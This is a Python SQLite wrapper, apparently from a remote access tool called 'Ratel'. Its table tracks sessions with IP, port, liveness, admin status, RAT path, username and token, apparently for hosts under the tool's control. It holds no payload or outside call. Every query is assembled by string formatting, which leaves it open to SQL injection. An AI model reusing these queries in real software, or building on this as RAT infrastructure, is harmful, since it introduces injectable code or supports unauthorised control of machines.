import sqlite3
import os
from .other import printColor
'''
https://www.sqlitetutorial.net/sqlite-python/creating-database/
When you connect to an SQLite database file that does not exist, SQLite automatically creates the new database for you.
sqlite3
'''

class Sql:
    
    def __init__(self,name_db, name_file_table, name_table):

        self.name_db = name_db 
        self.name_file_table = name_file_table #The ratel table file name
        self.name_table = name_table
        self.conn = self.setConnection() #self.setConnection()
        self.cursor = self.setCursor() # self.setCursor()
        self.setDB()


    def setConnection(self):
    #create a database connection to a SQLite database 
        conn = None
        try:
           
            conn = sqlite3.connect(self.name_db, check_same_thread=False) #https://stackoverflow.com/questions/48218065/programmingerror-sqlite-objects-created-in-a-thread-can-only-be-used-in-that-sa/60902437
          
        except sqlite3.Error as e:
            printColor("error","setConnection: {}".format(e))
            
        finally:
            return conn


    def setCursor(self):
        cursor = None
        if not(self.conn):
            print("[-] The cursor cannot create.")
        else:
            #print("[+] Cursor ok.")
            cursor = self.conn.cursor()
            return cursor


    def closeConn(self):
        self.conn.close()


    def readFile(self,name_file):
        #read external file.
        try:
            with open(name_file,"r") as file:
                return str(file.read())
        except IOError as e:
            print(e)
            return ""


    def checkFileExists(self,name):
        true_or_false = None
        try:
            file = open(name)
            true_or_false = True

        except IOError:
            #print("File not accessible")
            true_or_false = False
        
        finally:
            file.close()
            return true_or_false
    

    def execSqlCode(self,sql_code, commit=False, display=False):

        try:
            self.cursor.execute(sql_code)
            if(display):
                print(self.cursor.fetchone())

        except sqlite3.Error as e:
            print("Error in execSqlCode: ",e)
        finally:
            if(commit):
                self.conn.commit()
            else:
                pass


    def selectAll(self):
        list_of_rows = []
        '''
        returns a list of tuple,
        each row in the database and store in a tuple.
        '''        
        try:

            self.cursor.execute("""SELECT * FROM {}""".format(self.name_table))
            rows = self.cursor.fetchall()
            
            for row in rows: 
                list_of_rows.append(row)
                

        except sqlite3.Error as e:
            print("Error in selectAll ",e)
        finally:        
            self.conn.commit()
            
            return list_of_rows


    def insertInDatabase(self, session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token):
        #https://stackoverflow.com/questions/35415469/sqlite3-unique-constraint-failed-error ERROR WINDOWS
        self.execSqlCode("""INSERT or REPLACE INTO {}(session, ip, port, is_he_alive, is_he_admin, path_RAT, username, token) VALUES({},"{}",{},"{}","{}","{}","{}","{}")""".format(self.name_table, session ,ip, port, is_he_alive, is_he_admin, path_RAT, username, token),True)
        

    def updateValue(self, column, value, session,is_string=False):#https://www.tutorialspoint.com/sqlite/sqlite_update_query.htm
        if not(is_string):
            self.execSqlCode("""UPDATE {} SET {} = {} WHERE session = {} """.format(self.name_table, column, value, session),True)
        else:
            self.execSqlCode("""UPDATE {} SET {} = "{}" WHERE session = {} """.format(self.name_table, column, value, session),True)
        
    def returnValue(self, session, column): 
        '''returns a value in the db.'''
        row = ""
        try:
            self.cursor.execute("""SELECT {} FROM {} WHERE session = {} """.format(column, self.name_table ,int(session) ))
            row = self.cursor.fetchone()  #return tuple
            #print("returnValue -->",row)
        except sqlite3.Error as e:
            print("Error in returnValue: ",e)
        finally:
            self.conn.commit()
            return str(row[0])
    
    
    def returnLastSession(self):
        '''returns the last session.'''
        try:
            self.cursor.execute("""SELECT MAX(session) FROM {}""".format(self.name_table))
            row = self.cursor.fetchone()  #return tuple
            
        #    print("-->",type(row),len(row))
        
        except sqlite3.Error as e:
            print("Error in returnLastSession: ",e)
        finally:
            self.conn.commit()
            return int(row[0])


    def setDB(self):
        '''insert code sql for create table ratel.'''
        self.execSqlCode(self.readFile(self.name_file_table),True) #Create table if no exists
 

    def setTrueOrFalse(self,data):
        #Convert a string from the database to Boolean
        if("False" in data):
            return False
        elif("True" in data):
            return True
        else:
            return data
